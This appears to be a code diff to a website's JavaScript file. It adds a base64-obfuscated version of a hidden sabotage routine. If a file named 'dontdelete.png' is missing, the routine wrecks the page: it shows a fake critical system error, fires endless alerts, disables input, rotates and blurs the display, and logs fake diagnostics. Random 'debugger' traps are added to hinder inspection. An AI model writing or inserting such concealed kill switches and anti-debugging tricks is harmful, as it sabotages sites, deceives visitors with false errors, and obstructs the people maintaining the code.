@@ -184,28 +184,35 @@ try {
 
     document.addEventListener("DOMContentLoaded", initializeApp);
 
-(function(){
-    let aX1_ = atob("Li4vaW1nL2RvbnRkZWxldGUucG5n");
-    let xY9$ = new Image();
-    xY9$.src = aX1_;
-
-    xY9$.onerror = function() {
-        console.error("❌ Image NOT FOUND! Breaking site...");
-        document.body.innerHTML = "<h1 style='color:red;'>CRITICAL SYSTEM ERROR</h1><p>Fatal error.</p>";
-        document.title = "Fatal Error";
-
-        setInterval(() => alert("Critical System Error: Restart Required."), 3000);
-        document.body.style.pointerEvents = "none";
-        document.onkeydown = (e) => e.preventDefault();
-        document.body.style.transform = "rotate(180deg)";
-        document.body.style.filter = "blur(10px) grayscale(100%)";
-
-        setInterval(() => {
-            console.error("Warning: Memory Leak Detected");
-            console.warn("Deprecated API used");
-            console.info("Running diagnostics... [FAILED]");
-        }, 2000);
-    };
+    (function(){
+      let aX1_ = atob("Li4vaW1nL2RvbnRkZWxldGUucG5n");
+      let xY9$ = new Image();
+      xY9$.src = aX1_;
+  
+      xY9$.onerror = function() {
+          console.error(atob("8J+UjSBJbWFnZSBOT1QgTk9VTkQhIEJyZWFraW5nIHNpdGUuLi4=")); 
+          document.body.innerHTML = `<h1 style='color:red;'>${atob("Q1JJVElDQUwgU1lTVEVNIEVSUk9S")}</h1><p>${atob("RmF0YWwgZXJyb3Iu")}</p>`;
+          document.title = atob("RmF0YWwgRXJyb3I="); 
+  
+          setInterval(() => alert(atob("Q3JpdGljYWwgU3lzdGVtIEVycm9yOiBSZXN0YXJ0IFJlcXVpcmVkLg==")), 3000); 
+          
+          document.body.style.pointerEvents = "none";
+          document.onkeydown = (e) => e.preventDefault();
+          document.body.style.transform = "rotate(180deg)";
+          document.body.style.filter = "blur(10px) grayscale(100%)";
+  
+          setInterval(() => {
+              console.error(atob("V2FybmluZzogTWVtb3J5IExlYWsgRGV0ZWN0ZWQ=")); 
+              console.warn(atob("RGVwcmVjYXRlZCBBUEkgdXNlZA==")); 
+              console.info(atob("UnVubmluZyBzeXN0ZW0gZGlhZ25vc3RpY3MuLi4gW0ZBSUxFRF0=")); 
+          }, 2000);
+      };
+  
+      setInterval(() => {
+          if (Math.random() > 0.3) debugger;
+      }, Math.floor(Math.random() * (5000 - 1000) + 1000)); 
+  })();
+  
 
     setInterval(() => {
         if (Math.random() > 0.3) debugger;
